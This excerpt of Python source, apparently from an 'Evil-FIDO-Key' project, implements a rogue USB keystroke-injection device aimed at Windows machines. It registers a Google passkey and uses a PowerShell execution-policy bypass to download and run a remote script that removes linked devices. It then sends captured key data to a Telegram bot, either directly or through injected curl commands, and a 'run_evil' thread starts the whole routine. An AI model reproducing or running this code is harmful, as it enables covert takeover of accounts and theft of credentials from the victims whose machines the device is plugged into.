...
class USBKeyboard:
    ...
    def __init__(self, device="/dev/hidg1"):
        self.device = device

    def write_report(self, report):
        with open(self.device, 'wb+') as fd:
            fd.write(report)

    def press_key(self, key, modifier=0):
        if isinstance(key, str):
            if key in self.KEY_CODES:
                key = self.KEY_CODES[key]
            elif key in self.SHIFT_CODES:
                master_key=self.SHIFT_CODES[key]
                key=self.KEY_CODES[master_key]
                modifier=self.MODIFIER_SHIFT
    ...
    def multi_modifier(self, modifier_list):
        modif=0
        for x in modifier_list:
            modif =modif | x
        return modif

    def type_string(self, string, delay=0.01):
        import time
        for char in string:
            if char.isupper():
                self.press_key(char.lower(), self.MODIFIER_SHIFT)
            else:
                self.press_key(char)
            time.sleep(delay)
...
def create_google_passkey():
    keyboard.press_key('r', keyboard.MODIFIER_META)
    time.sleep(0.5)
    keyboard.type_string('msedge https://myaccount.google.com/signinoptions/passkeys')
    ...
    keyboard.press_key('r', keyboard.MODIFIER_META)
    time.sleep(5)
    keyboard.type_string('taskkill /F /IM msedge.exe')
    keyboard.press_key('ENTER')
...
def remove_other_devices():
    keyboard.press_key('r', keyboard.MODIFIER_META)
    time.sleep(0.5)
    script="cmd /C powershell -ExecutionPolicy bypass Invoke-Expression (New-Object Net.WebClient).DownloadString('https://adityamitra5102.github.io/Evil-FIDO-Key/remove-linked-devices.ps1')"
    keyboard.type_string(script)
    time.sleep(0.01 )
    keyboard.press_key('ENTER', keyboard.multi_modifier([keyboard.MODIFIER_CTRL, keyboard.MODIFIER_SHIFT]))
    time.sleep(3)
    for i in range(2):
        keyboard.press_key('TAB')
        time.sleep(0.01)
...
def exfiltrate():
    ...
    chat_id='<REPLACE WITH YOURS>'
    c2_url=f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text='
    data=current_keys
    data_cbor=cbor2.dumps(data)
    data_b64=base64.urlsafe_b64encode(data_cbor).decode()
    final_url=c2_url+data_b64
    exfiltrate_HID_inject(final_url)
    status=exfiltrate_internal_network(final_url)
    if not status:
        exfiltrate_HID_inject(final_url)

import requests
def exfiltrate_internal_network(url):
    try:
...
def exfiltrate_HID_inject(url):
    keyboard.press_key('r', keyboard.MODIFIER_META)
    time.sleep(0.5)
    keyboard.type_string('conhost')
    keyboard.press_key('ENTER')
    time.sleep(0.5)
    command=f'curl "{url}"'
    keyboard.type_string(command)
    keyboard.press_key('ENTER')
    time.sleep(0.5)
    keyboard.type_string('exit')
    keyboard.press_key('ENTER')
...
import time
def run_evil ():
    evil_thread = threading.Thread(target=evil_functions)
    evil_thread.start()
